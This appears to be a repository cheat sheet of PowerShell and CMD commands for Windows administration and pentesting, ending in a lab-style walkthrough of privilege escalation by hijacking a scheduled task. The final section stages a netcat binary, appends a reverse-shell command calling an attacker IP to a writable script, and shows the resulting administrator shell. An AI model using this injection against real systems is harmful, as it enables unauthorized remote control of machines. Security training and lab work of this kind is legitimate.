# PowerShell & CMD: Technical Reference for SysAdmin and Pentesting

This repository serves as the master reference for PowerShell administration and security assessment. All procedures adhere to "Security by Design" principles and emphasize operational safety in production environments.

## 1. Legacy CMD Bridge (Enumeration & Troubleshooting)
Legacy commands are essential during initial enumeration to avoid triggering PowerShell logging/alerting in monitored environments.

### Networking Enumeration
* `ipconfig /all` - Display comprehensive IP configuration.
* `netstat -ano` - List active TCP/UDP connections and associated PIDs.
* `arp -a` - Display ARP table entries.
* `route print` - View routing tables.
* `nbtstat -c` - View NetBIOS name cache.

### System & Authentication
* `tasklist /v` - List running processes with verbose details.
* `systeminfo` - Query system configuration and patch status.
* `whoami /all` - Retrieve current security context.
* `net localgroup administrators` - Verify local administrative members.
* `net user` - Query detailed user account information.

---

## 2. File System Operations
### Navigation and Listing
* `Set-Location C:\Logs` - Change working directory (cd).
* `Get-Location` - Print current path (pwd).
* `Get-ChildItem -Path C:\Logs -Filter *.log -Recurse` - Recursive directory listing with filters.

### Create, Copy, Move, Delete
* `New-Item -Path C:\Logs\app -ItemType Directory -Force` - Provision directory structures.
* `Copy-Item C:\Source\file.txt C:\Dest\ -Force` - Copy assets.
* `Move-Item C:\Old\file.txt C:\New\file.txt` - Move assets.
* `Remove-Item C:\Temp\* -Recurse -Force` - Delete files.

### Read and Write Files
* `Get-Content C:\Logs\app.log` - Read all lines.
* `Get-Content C:\Logs\app.log -Tail 50` - Read last 50 lines.
* `Set-Content C:\Config\settings.txt 'value'` - Overwrite file.
* `Add-Content C:\Logs\script.log 'entry'` - Append to file.
* `Out-File C:\Reports\out.txt` - Write pipeline output.

### Test, Measure, and Archive
* `Test-Path C:\Logs\app.log` - Boolean check for existence.
* `(Get-Item C:\Logs\app.log).Length` - File size in bytes.
* `Get-Content C:\Data\file.csv | Measure-Object -Line` - Count lines.
* `Get-FileHash C:\Installer.exe -Algorithm SHA256` - Calculate cryptographic checksum.
* `Compress-Archive -Path C:\Logs\* -DestinationPath C:\Archive\logs.zip -Force` - Archive files.
* `Expand-Archive -Path C:\Archive\logs.zip -DestinationPath C:\Logs\Expanded` - Extract archive.

---

## 3. Process & Service Management
### Services
* `Get-Service` - List all services.
* `Get-Service -Name W3SVC` - Access specific service.
* `Start-Service W3SVC` - Start service.
* `Stop-Service W3SVC -Force` - Stop service.
* `Restart-Service W3SVC` - Restart service.
* `Set-Service W3SVC -StartupType Automatic` - Configure persistent startup.
* `Get-Service | Where-Object Status -ne Running` - Identify stopped services.

### Processes
* `Get-Process` - List all processes.
* `Get-Process -Name chrome` - Access specific process.
* `Stop-Process -Name notepad -Force` - Kill process by name.
* `Stop-Process -Id 1234 -Force` - Kill process by PID.
* `Get-Process | Sort-Object CPU -Descending | Select-Object -First 10` - Monitor top 10 CPU consumers.
* `Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 10` - Monitor top 10 RAM consumers.

### Scheduled Tasks
* `Get-ScheduledTask | Where-Object State -eq 'Running'` - List running tasks.
* `Start-ScheduledTask -TaskName 'MyTask'` - Start task.
* `Stop-ScheduledTask -TaskName 'MyTask'` - Stop task.

---

## 4. Networking and Remote Commands
### Network Info
* `Get-NetIPAddress -AddressFamily IPv4` - IP configurations.
* `Get-NetAdapter | Where-Object Status -eq Up` - Active adapters.
* `Get-NetTCPConnection | Where-Object State -eq Listen` - Listening ports.
* `Test-Connection -ComputerName server01 -Count 1` - Ping.
* `Test-NetConnection -ComputerName server01 -Port 443` - TCP port test.
* `Resolve-DnsName server01.contoso.com` - DNS Lookup.

### HTTP Requests
* `Invoke-WebRequest -Uri '[https://api.example.com](https://api.example.com)' -Method GET` - Web request.
* `Invoke-RestMethod -Uri '[https://api.example.com/data](https://api.example.com/data)' -Method POST -Body ($body | ConvertTo-Json) -ContentType 'application/json'` - REST API interaction.

### Remoting
* `Invoke-Command -ComputerName server01 -ScriptBlock { Get-Service }` - Execute remote commands.
* `Enter-PSSession -ComputerName server01` - Interactive session.
* `$session = New-PSSession -ComputerName server01` - Create persistent session.
* `Invoke-Command -Session $session -ScriptBlock { hostname }` - Use persistent session.
* `Remove-PSSession $session` - Close session.

---

## 5. Data Manipulation & Scripting Logic
### String Operations
* `'hello world'.ToUpper()` - To uppercase.
* `'hello world'.Replace('hello','hi')` - String replacement.
* `'hello world' -split ' '` - Delimiter separation.
* `'a','b','c' -join ', '` - Array concatenation.
* `'hello world' -match 'w(\w+)'` - Regex matching.
* `' hello '.Trim()` - Trim whitespace.

### Formatting and Math
* `Get-Date -Format 'yyyy-MM-dd HH:mm:ss'` - Date formatting.
* `'{0:N2}' -f 1234567.89` - Number formatting.
* `[math]::Round(3.14159, 2)` - Rounding.

### JSON / CSV
* `$obj | ConvertTo-Json -Depth 5` - Object to JSON.
* `$json | ConvertFrom-Json` - JSON to Object.
* `Import-Csv C:\data.csv` - Parse CSV.
* `Export-Csv C:\out.csv -NoTypeInformation` - Export CSV.
* `$str | ConvertFrom-Csv -Header Name,Dept` - String to CSV object.

### Variables and Types
* `$psvt = $PSVersionTable.PSVersion` - PS Version check.
* `[int]'42'` - Cast to integer.
* `[string]42` - Cast to string.
* `$null -eq $var` - Null check.
* `@($result).Count` - Safe count.

---

## 6. Error Handling and Logging
### Error Handling
```powershell
$ErrorActionPreference = 'Stop'
try {
    Get-Content C:\Logs\missing.txt -ErrorAction Stop
} catch [System.IO.FileNotFoundException] {
    Write-Warning "File not found: $($_.Exception.Message)"
} catch {
    Write-Error "Unexpected error: $($_.Exception.Message)"
} finally {
    Write-Host 'Cleanup done'
}
```

### Output Streams
* `Write-Host 'Normal output'` - Console output.
* `Write-Verbose 'Diagnostic info'` - Verbose output.
* `Write-Warning 'Caution message'` - Warning.
* `Write-Error 'Error message'` - Error.
* `Add-Content C:\Logs\script.log "$(Get-Date) - Entry"` - Log to file.
* `$value = $maybeNull ?? 'default'` - Null coalescing (PS 7+).
* `$obj?.Property` - Safe navigation.

---

## 7. Active Directory (AD) Operations
### Users
* `Get-ADUser -Identity 'jsmith' -Properties *` - Retrieve all user attributes.
* `Get-ADUser -Filter "Department -eq 'IT'"` - Filter users.
* `New-ADUser -Name 'Jane Doe' -SamAccountName 'jdoe' -AccountPassword (Read-Host -AsSecureString) -Enabled $true` - Provision user.
* `Set-ADUser -Identity 'jsmith' -Title 'Senior Engineer'` - Update attribute.
* `Disable-ADAccount 'jsmith'` / `Enable-ADAccount 'jsmith'` - Status toggle.
* `Unlock-ADAccount 'jsmith'` - Unlock user.
* `Set-ADAccountPassword -Identity 'jsmith' -Reset -NewPassword (ConvertTo-SecureString 'NewP@ss!' -AsPlainText -Force)` - Password reset.

### Groups
* `Get-ADGroup -Identity 'Domain Admins' -Properties Members` - Group details.
* `Get-ADGroupMember -Identity 'IT-Admins'` - List group members.
* `Add-ADGroupMember -Identity 'IT-Admins' -Members 'jsmith'` - Add user to group.
* `Remove-ADGroupMember -Identity 'IT-Admins' -Members 'jsmith' -Confirm:$false` - Remove user from group.

---

## 8. Advanced Security & Pentesting
### Execution Policy & Access Control
* `Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force` - Manage execution constraints.
* `Get-Acl -Path 'C:\SensitiveData' | Select-Object -ExpandProperty Access` - Audit object permissions.

### Base64 Payload Handling
```powershell
$bytes = [System.Text.Encoding]::UTF8.GetBytes('Payload')
$encoded = [System.Convert]::ToBase64String($bytes)
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
```

---

## 9. Operational One-Liners (Auditing)
* **Find large files**: `Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue | Sort-Object Length -Descending | Select-Object -First 20 | Select-Object FullName, @{N='MB';E={[math]::Round($_.Length/1MB,2)}}`
* **Get local admins**: `Get-LocalGroupMember -Group 'Administrators'`
* **Find open firewall ports**: `Get-NetFirewallRule -Enabled True -Direction Inbound | Get-NetFirewallPortFilter | Select-Object Protocol, LocalPort`
* **Export services to CSV**: `Get-Service | Where-Object Status -eq Running | Export-Csv C:\Reports\running_services.csv -NoTypeInformation`
* **Kill processes by name**: `Get-Process notepad -ErrorAction SilentlyContinue | Stop-Process -Force`
* **Get Windows version**: `$PSVersionTable.PSVersion` ; `(Get-CimInstance Win32_OperatingSystem).Caption`
* **Recently modified files**: `Get-ChildItem C:\Logs -Recurse -File | Where-Object LastWriteTime -gt (Get-Date).AddHours(-24) | Select-Object Name, LastWriteTime`

---

## 10. Operational Guardrails & Compatibility
* **-WhatIf**: Simulates commands to preview impact (e.g., `Remove-Item ... -WhatIf`).
* **Version Compatibility**: Always validate using `$PSVersionTable.PSVersion`.
* **Pipeline Integrity**: Use `Get-CimInstance` (modern) instead of `Get-WmiObject` (deprecated).
* **Alias Usage**: Use full cmdlet names in scripts. Interactive aliases (e.g., `ls`, `curl`) should be reserved for interactive shell use to prevent unpredictable behavior.

# 11. Cheat Sheet: Windows Privilege Escalation via Scheduled Task Hijacking

This document outlines the complete exploitation path for escalating privileges by hijacking a vulnerable scheduled task. The scenario assumes Write access to a PowerShell script (`backupprep.ps1`) executed periodically by a high-privileged account (Administrator).

## 1. Payload Staging (Attacker Machine)
Locate a valid Windows PE (Portable Executable) Netcat binary to avoid OS platform mismatch errors. Host it via a temporary HTTP server for target retrieval.

```bash
# Locate the cross-compiled Windows binary on Kali Linux
cd /usr/share/windows-resources/binaries/

# Host the payload via HTTP
python3 -m http.server 8080
```

## 2. Exploit Preparation (Attacker Machine)
Initialize the reverse shell listener on the attacker machine before the scheduled task triggers on the target.

```bash
# Set up a Netcat listener on the designated port
nc -lvnp 4444
```

## 3. Payload Transfer & Code Injection (Target Machine)
Download the binary to a globally writable directory on the target environment (e.g., `C:\Temp`). Inject the execution command into the vulnerable scheduled script.

```powershell
# Append the payload execution to the vulnerable script.
# The '-e cmd.exe' flag binds the Command Prompt to the TCP socket.
echo "C:\Temp\nc.exe <ATTACKER_IP> 4444 -e cmd.exe" >> C:\ProgramData\CorpBackup\Scripts\backupprep.ps1
```
*(Note: In live environments, it is recommended to execute the payload asynchronously using `Start-Process` to avoid hanging the Task Scheduler).*

## 4. Exploitation & Verification
Once the Task Scheduler executes the modified script, the reverse shell callback is received, granting interactive access under the context of the task owner.

```cmd
listening on [any] 4444 ...
connect to [10.10.15.120] from (UNKNOWN) [10.129.73.207] 49687
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
win01\administrator
```

### ⚠️ Post-Exploitation Note (Shell Environment)
Because the payload binds to `cmd.exe`, standard Linux or PowerShell aliases will not function. 
* Use `dir` instead of `ls` to list directory contents.
* Use `cd` (without arguments) instead of `pwd` to print the current working directory.